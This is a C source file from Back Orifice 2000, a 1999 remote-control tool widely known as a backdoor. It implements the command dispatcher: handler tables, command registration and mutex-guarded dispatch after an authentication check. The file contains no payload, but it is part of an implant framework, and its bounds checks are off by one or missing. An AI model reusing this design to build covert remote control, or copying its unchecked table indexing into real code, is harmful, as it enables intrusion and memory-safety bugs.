/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// BO2K Command Dispatcher

#include<windows.h>
#include<bocomreg.h>

BO_CMD_HANDLER *command_handler_table=NULL;
BO_CMD_DESC *command_description_table=NULL;

HANDLE g_hDispatchMutex=NULL;
                                          
int InitializeCommandDispatcher(void)
{
	int i;

	command_handler_table=(BO_CMD_HANDLER *)malloc(sizeof(BO_CMD_HANDLER)*MAX_BO_COMMANDS);
	if(command_handler_table==NULL) return -1;
	command_description_table=(BO_CMD_DESC *)malloc(sizeof(BO_CMD_DESC)*MAX_BO_COMMANDS);
	if(command_description_table==NULL) return -1;
	
	for(i=0;i<MAX_BO_COMMANDS;i++) {
		command_handler_table[i]=NULL;
	}

	g_hDispatchMutex=CreateMutex(NULL,FALSE,NULL);
	if(g_hDispatchMutex==NULL) return -1;

	return 0;
}

int KillCommandDispatcher(void)
{
	CloseHandle(g_hDispatchMutex);

	if(command_handler_table) free(command_handler_table);	
	if(command_description_table) free(command_description_table);	

	return 0;
}

int RegisterNativeCommand(int command, BO_CMD_HANDLER handler)
{	
	if(command<0 || command>MAX_BO_COMMANDS)
		return -1;

	command_handler_table[command]=handler;
	command_description_table[command].svCommName="";
	command_description_table[command].svFolderName="";
	command_description_table[command].svArgDesc1="";
	command_description_table[command].svArgDesc2="";
	command_description_table[command].svArgDesc3="";
	
	command_description_table[command].bNativeComm=TRUE;
	return 0;
}

int RegisterCommand(BO_CMD_HANDLER handler, char *svFolderName, char *svCommName, char *svArgDesc1, char *svArgDesc2, char *svArgDesc3)
{
	int i;

	for(i=200;i<MAX_BO_COMMANDS;i++) {
		if(command_handler_table[i]==INVALID_CMD_HANDLER) break;
	}
	if(i==MAX_BO_COMMANDS) return -1;

	command_handler_table[i]=handler;
	command_description_table[i].svCommName=svCommName;
	command_description_table[i].svFolderName=svFolderName;
	command_description_table[i].svArgDesc1=svArgDesc1;
	command_description_table[i].svArgDesc2=svArgDesc2;
	command_description_table[i].svArgDesc3=svArgDesc3;
	command_description_table[i].bNativeComm=FALSE;

	return i;
}

int UnregisterCommand(int command)
{
	if(command<0 || command>=MAX_BO_COMMANDS) return -1;
	if(command_handler_table[command]==INVALID_CMD_HANDLER) return -1;

	command_handler_table[command]=INVALID_CMD_HANDLER;
	command_description_table[command].bNativeComm=FALSE;

	return 0;
}

int DispatchCommand(int command, CAuthSocket *cas_from, int comid, int nArg1, char *svArg2, char *svArg3)
{
	BO_CMD_HANDLER handler;
	int ret;
	
	if(WaitForSingleObject(g_hDispatchMutex,INFINITE)!=WAIT_OBJECT_0) {
		return -1;
	}

	if(cas_from->GetAuthHandler()->pValidateCommand(cas_from->GetUserID(), command)==FALSE) {
		ReleaseMutex(g_hDispatchMutex);
		return -1;
	}

	handler=command_handler_table[command];
	if(handler==INVALID_CMD_HANDLER) {
		ReleaseMutex(g_hDispatchMutex);
		return -1;
	}

	ret=handler(cas_from, comid, nArg1, svArg2, svArg3);
	
	ReleaseMutex(g_hDispatchMutex);

	return ret;
}

		 
